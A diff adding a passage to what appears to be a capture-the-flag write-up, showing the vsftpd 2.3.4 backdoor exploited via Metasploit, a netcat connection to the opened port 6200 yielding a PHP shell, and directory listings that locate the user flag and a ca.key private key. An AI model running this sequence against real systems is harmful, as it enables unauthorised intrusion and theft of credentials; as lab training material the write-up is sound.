@@ -62,4 +62,103 @@ Exploit target:
    --  ----
    0   Automatic
 ```
-The only thing that we have to set is the RHOSTS.
+The only thing that we have to set is the RHOSTS. Running the exploit we see that the expoit completed but no sessions was created
+```
+msf5 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 10.10.10.131
+RHOSTS => 10.10.10.131
+msf5 exploit(unix/ftp/vsftpd_234_backdoor) > run
+
+[*] 10.10.10.131:21 - Banner: 220 (vsFTPd 2.3.4)
+[*] 10.10.10.131:21 - USER: 331 Please specify the password.
+[*] Exploit completed, but no session was created.
+```
+If we run the exploit a second time we get a different message. It says that the port for the backdoor is open but its not a shell which most likely means its not a bash shell.
+```
+msf5 exploit(unix/ftp/vsftpd_234_backdoor) > run
+
+[*] 10.10.10.131:21 - The port used by the backdoor bind listener is already open
+[-] 10.10.10.131:21 - The service on port 6200 does not appear to be a shell
+[*] Exploit completed, but no session was created.
+```
+Running an nmap scan on port 6200 will show that the port is now open
+```
+# nmap -p 6200 10.10.10.131
+Starting Nmap 7.80 ( https://nmap.org ) at 2019-09-18 12:30 EDT
+Nmap scan report for 10.10.10.131
+Host is up (0.096s latency).
+
+PORT     STATE SERVICE
+6200/tcp open  lm-x
+
+Nmap done: 1 IP address (1 host up) scanned in 0.79 seconds
+```
+We can use netcat to connect to the backdoor. Once in we are greeted with a Psy Shell which is basically a php Shell
+```
+# nc -nv 10.10.10.131 6200
+Ncat: Version 7.80 ( https://nmap.org/ncat )
+Ncat: Connected to 10.10.10.131:6200.
+Psy Shell v0.9.9 (PHP 7.2.10 — cli) by Justin Hileman
+```
+To navigate this shell we will need to use php commands. Listing the <b>/home</b> directory will reveal multiple different users
+```
+scandir('/home');
+=> [
+     ".",
+     "..",
+     "berlin",
+     "dali",
+     "nairobi",
+     "oslo",
+     "professor",
+   ]
+```
+If we list the contents of each users home directory, we will see a couple things.
+- The user flag is located in <b>/home/berlin</b>
+- There is a  <b>ca.key</b> file located at <b>/home/nairobi</b>
+```
+scandir('/home/berlin');
+=> [
+     ".",
+     "..",
+     ".ash_history",
+     ".ssh",
+     "downloads",
+     "node_modules",
+     "server.js",
+     "user.txt",
+   ]
+scandir('/home/dali');
+=> [
+     ".",
+     "..",
+     ".ash_history",
+     ".config",
+     ".qmail-default",
+     ".ssh",
+     "server.js",
+   ]
+scandir('/home/nairobi');
+=> [
+     ".",
+     "..",
+     "ca.key",
+     "download.jade",
+     "error.jade",
+     "index.jade",
+     "node_modules",
+     "server.js",
+     "static",
+   ]
+dir('/home/oslo');
+=> [
+     ".",
+     "..",
+     "Maildir",
+     "inbox.jade",
+     "index.jade",
+     "node_modules",
+     "package-lock.json",
+     "server.js",
+     "static",
+   ]
+```
